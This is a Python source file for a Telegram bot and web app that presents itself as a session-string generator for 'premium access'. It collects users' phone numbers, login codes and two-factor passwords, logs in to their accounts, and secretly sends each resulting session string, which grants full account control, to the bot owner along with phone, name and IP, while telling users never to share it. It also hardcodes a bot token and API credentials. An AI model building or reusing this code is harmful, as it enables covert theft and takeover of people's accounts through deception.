#!/usr/bin/env python3
"""
ZISKY SESSION GENERATOR BOT
FINAL VERSION - NO ASYNCIO ERRORS
Uses session string persistence to avoid cross-thread client sharing
"""

import asyncio
import logging
import sqlite3
import threading
import time
import os
import uuid
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

# ========== CONFIGURATION ==========
BOT_TOKEN = "8240405151:AAHyqSwjXE39_o_YvGXSv_9PCx1m8ZIYH84"
API_ID = 38550990
API_HASH = "26c65e47681802c551563f11b6b333a4"
OWNER_ID = 8158086374
PUBLIC_URL = "https://sessionsgen.onrender.com"

# ========== SETUP ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database setup
conn = sqlite3.connect('sessions.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS sessions
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              user_id INTEGER,
              telegram_id INTEGER,
              phone TEXT,
              session_string TEXT,
              first_name TEXT,
              username TEXT,
              generated_at TEXT,
              ip TEXT,
              method TEXT)''')
conn.commit()

# Store temporary session data (NOT the client)
temp_sessions = {}

# ========== FLASK WEB APP ==========
app = Flask(__name__)
app.secret_key = os.urandom(24)

@app.route('/')
def index():
    return render_template('code_input.html')

# ===== METHOD 1: PHONE + CODE =====
@app.route('/request-code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone')
    user_telegram_id = data.get('user_id')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    # Generate a unique session ID
    session_id = str(uuid.uuid4())
    
    try:
        # Run the entire operation in a single thread
        def request_code_thread():
            # Create a brand new event loop for this thread
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            async def _request():
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                try:
                    await client.connect()
                    await client.send_code_request(phone)
                    # Save the temporary session state
                    temp_session_string = client.session.save()
                    await client.disconnect()
                    return {'success': True, 'temp_session': temp_session_string}
                except Exception as e:
                    await client.disconnect()
                    return {'success': False, 'error': str(e)}
            
            try:
                result = loop.run_until_complete(_request())
                return result
            finally:
                loop.close()
        
        # Execute in thread pool
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(request_code_thread)
            result = future.result(timeout=30)
        
        if result.get('success'):
            # Store the temporary session string
            temp_sessions[session_id] = {
                'temp_session': result['temp_session'],
                'phone': phone,
                'telegram_id': user_telegram_id,
                'created_at': time.time()
            }
            return jsonify({'success': True, 'session_id': session_id})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password', '')
    user_telegram_id = data.get('user_id')
    session_id = data.get('session_id')
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired. Start over.'})
    
    temp_data = temp_sessions[session_id]
    temp_session_string = temp_data['temp_session']
    
    def verify_code_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def _verify():
            # Recreate client from the temporary session
            client = TelegramClient(StringSession(temp_session_string), API_ID, API_HASH)
            try:
                await client.connect()
                
                try:
                    await client.sign_in(phone, code)
                except SessionPasswordNeededError:
                    if not password:
                        return {'success': False, 'error': '2FA password required'}
                    await client.sign_in(password=password)
                
                me = await client.get_me()
                final_session_string = client.session.save()
                await client.disconnect()
                
                return {
                    'success': True,
                    'session': final_session_string,
                    'user_id': me.id,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'username': me.username,
                    'phone': me.phone
                }
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {'success': False, 'error': 'Invalid code'}
            except Exception as e:
                await client.disconnect()
                return {'success': False, 'error': str(e)}
        
        try:
            result = loop.run_until_complete(_verify())
            return result
        finally:
            loop.close()
    
    try:
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(verify_code_thread)
            result = future.result(timeout=60)
        
        if result.get('success'):
            ip = request.remote_addr
            
            # Save to database
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute('''INSERT INTO sessions 
                        (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (result['user_id'], user_telegram_id, phone, result['session'], 
                      f"{result['first_name']} {result.get('last_name', '')}", 
                      result.get('username'), datetime.now().isoformat(), ip, 'phone_code'))
            conn.commit()
            conn.close()
            
            # Send to owner
            send_to_owner(
                result['user_id'],
                user_telegram_id,
                phone,
                result['session'],
                f"{result['first_name']} {result.get('last_name', '')}",
                result.get('username'),
                'phone_code'
            )
            
            # Send to user
            send_to_user(user_telegram_id, result['session'])
            
            # Clean up temp session
            del temp_sessions[session_id]
            
            return jsonify({
                'success': True,
                'session': result['session']
            })
        else:
            return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ===== METHOD 2: API ID + HASH =====
@app.route('/generate-session', methods=['POST'])
def generate_session():
    data = request.json
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    user_telegram_id = data.get('user_id')
    
    if not api_id or not api_hash:
        return jsonify({'success': False, 'error': 'API ID and Hash required'})
    
    try:
        api_id = int(api_id)
    except:
        return jsonify({'success': False, 'error': 'API ID must be a number'})
    
    if len(api_hash) < 10:
        return jsonify({'success': False, 'error': 'API Hash looks invalid'})
    
    def generate_session_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def _generate():
            client = TelegramClient(StringSession(), api_id, api_hash)
            try:
                await client.connect()
                
                # Check if already authorized
                if not await client.is_user_authorized():
                    await client.disconnect()
                    return {
                        'success': False,
                        'error': 'Phone verification required. Use Phone + Code method.'
                    }
                
                me = await client.get_me()
                session_string = client.session.save()
                await client.disconnect()
                
                return {
                    'success': True,
                    'session': session_string,
                    'user_id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': me.phone
                }
            except Exception as e:
                await client.disconnect()
                return {'success': False, 'error': str(e)[:100]}
        
        try:
            result = loop.run_until_complete(_generate())
            return result
        finally:
            loop.close()
    
    try:
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(generate_session_thread)
            result = future.result(timeout=30)
        
        if result.get('success'):
            ip = request.remote_addr
            
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute('''INSERT INTO sessions 
                        (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (result['user_id'], user_telegram_id, result.get('phone', 'Unknown'), result['session'], 
                      f"{result['first_name']} {result.get('last_name', '')}", 
                      result.get('username'), datetime.now().isoformat(), ip, 'api_hash'))
            conn.commit()
            conn.close()
            
            send_to_owner(
                result['user_id'],
                user_telegram_id,
                result.get('phone', 'Unknown'),
                result['session'],
                f"{result['first_name']} {result.get('last_name', '')}",
                result.get('username'),
                'api_hash'
            )
            
            send_to_user(user_telegram_id, result['session'])
            
            return jsonify({
                'success': True,
                'session': result['session']
            })
        else:
            return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

# ========== TELEGRAM BOT FUNCTIONS ==========
def send_to_owner(account_id, telegram_id, phone, session_string, first_name, username, method='unknown'):
    method_emoji = {
        'phone_code': '📱',
        'api_hash': '🔑',
        'unknown': '❓'
    }.get(method, '❓')
    
    message = f"""🔐 **NEW SESSION GENERATED** {method_emoji}

👤 **User:** {first_name}
🆔 **Account ID:** `{account_id}`
⭐ **Telegram ID (for premium):** `{telegram_id}`
📱 **Phone:** `{phone}`
🔗 **Username:** @{username if username else 'None'}
⏱️ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📌 **Method:** {method.replace('_', ' ').title()}

🔑 **SESSION STRING:**
`{session_string}`

⚠️ **Store this securely!**
"""
    try:
        application.bot.send_message(chat_id=OWNER_ID, text=message, parse_mode='Markdown')
    except Exception as e:
        print(f"Error sending to owner: {e}")

def send_to_user(telegram_id, session_string):
    message = f"""✅ **Session Generated Successfully!**

🔑 **Your Session String:**
`{session_string}`

⚠️ **IMPORTANT:**
• This is like your password
• Never share it with anyone
• Store it securely
• Anyone with this can access your account

⭐ **Premium Status:** Your Telegram ID `{telegram_id}` has been recorded for premium access.

📝 **To use it in Zisky bot:**
`/add_session {session_string[:30]}...`

💡 **Save this message or copy the session now!**
"""
    try:
        application.bot.send_message(chat_id=telegram_id, text=message, parse_mode='Markdown')
    except Exception as e:
        print(f"Error sending to user: {e}")

# ========== TELEGRAM COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    
    if not webapp_url:
        await update.message.reply_text("⚠️ **Web app URL not configured!**", parse_mode='Markdown')
        return
    
    keyboard = [[InlineKeyboardButton("🌐 Open Web App", web_app={'url': webapp_url})]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"👋 **Welcome to Zisky Session Generator, {user.first_name}!**\n\n"
        f"Generate Telegram session strings for premium access.\n\n"
        f"**Two Methods:**\n"
        f"1️⃣ **Phone + Code**\n"
        f"2️⃣ **API ID + Hash**\n\n"
        f"Click the button below to start!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "**Zisky Session Generator Help**\n\n"
        "**Commands:**\n"
        "/start - Start the bot\n"
        "/help - Show this help\n"
        "/status - Check bot status\n"
        "/url - Show current web app URL",
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    c.execute("SELECT COUNT(*) FROM sessions")
    total = c.fetchone()[0]
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    
    await update.message.reply_text(
        f"📊 **Bot Status**\n\n"
        f"✅ Bot is running\n"
        f"📱 Total Sessions: {total}\n"
        f"🔗 Web App: {webapp_url or 'Not configured'}",
        parse_mode='Markdown'
    )

async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /seturl https://your-domain.com")
        return
    
    global PUBLIC_URL
    PUBLIC_URL = context.args[0]
    os.environ['PUBLIC_URL'] = PUBLIC_URL
    await update.message.reply_text(f"✅ Web app URL set to: {PUBLIC_URL}")

async def show_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    await update.message.reply_text(f"🔗 **Current Web App URL:**\n{webapp_url or 'Not configured'}")

async def my_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command!")
        return
    
    c.execute("SELECT phone, first_name, generated_at, method, telegram_id FROM sessions ORDER BY generated_at DESC LIMIT 10")
    sessions = c.fetchall()
    
    if not sessions:
        await update.message.reply_text("No sessions found.")
        return
    
    text = "📋 **Recent Sessions**\n\n"
    for phone, name, date, method, tg_id in sessions:
        method_emoji = '📱' if method == 'phone_code' else '🔑'
        text += f"{method_emoji} {phone} - {name}\n"
        text += f"   🆔 TG ID: {tg_id}\n"
        text += f"   🕒 {date[:10]}\n\n"
    
    await update.message.reply_text(text[:4000], parse_mode='Markdown')

# ========== START BOT ==========
def main():
    global application, PUBLIC_URL
    
    print("🤖 Zisky Session Generator Bot")
    print("="*50)
    print(f"🔑 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"🆔 Owner ID: {OWNER_ID}")
    print("="*50)
    
    # Start Flask
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False))
    flask_thread.daemon = True
    flask_thread.start()
    print("✅ Flask web app started on port 5000")
    
    # Create Telegram bot
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("seturl", set_url))
    application.add_handler(CommandHandler("url", show_url))
    application.add_handler(CommandHandler("mysessions", my_sessions))
    
    print("🤖 Telegram bot started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
